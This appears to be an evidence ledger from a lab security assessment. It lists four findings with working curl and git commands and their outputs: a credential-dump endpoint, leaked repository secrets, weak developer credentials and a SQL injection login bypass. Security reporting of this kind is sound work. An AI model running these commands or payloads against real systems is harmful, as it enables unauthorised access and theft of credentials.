# Evidence Ledger

This ledger shows the proof style used by Verity. The complete raw working report is in [../full-lab-security-assessment.md](../full-lab-security-assessment.md).

## ZV-001: Customer API Credential Dump

Asset:

```text
customer-api.acme.local
```

Representative command:

```bash
curl --noproxy '*' -i http://customer-api.acme.local/api/internal/system/users-dump
```

Proof:

```text
HTTP/1.1 200 OK
"username": "admin"
"password": "pass1"
"admin": true
```

Admin session proof:

```bash
curl --noproxy '*' -i -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"pass1"}' \
  http://customer-api.acme.local/users/v1/login
```

## ZV-002: DevOps Hub Public Secrets

Representative commands:

```bash
curl --noproxy '*' -sS http://devops-hub.acme.local/api/v1/repos/search?limit=50
git clone http://devops-hub.acme.local/developer/app-config.git
git clone http://devops-hub.acme.local/developer/legacy-deployments.git
```

Proof:

```text
MYSQL_ROOT_PASSWORD=rootpass
MYSQL_PASSWORD=p@ssw0rd
VAULT_TOKEN=decoy-readonly-internal-ops-2026q1
-----BEGIN OPENSSH PRIVATE KEY-----
```

## ZV-003: DevOps Hub Weak Developer Account

Representative command:

```bash
curl --noproxy '*' -u developer:developer123 \
  http://devops-hub.acme.local/api/v1/user
```

Proof:

```text
HTTP 200
"login":"developer"
```

Follow-up proof showed repository permissions with `admin`, `pull`, and `push` set to `true`.

## ZV-004: Apex Markets SQL Injection

Representative request:

```bash
curl --noproxy '*' -i -H 'Content-Type: application/json' \
  -d '{"email":"'\'' or 1=1--","password":"x"}' \
  http://apex-markets.acme.local/rest/user/login
```

Proof:

```text
HTTP 200
"authentication":{"token":"..."}
```

Follow-up with the returned token accessed protected user APIs.
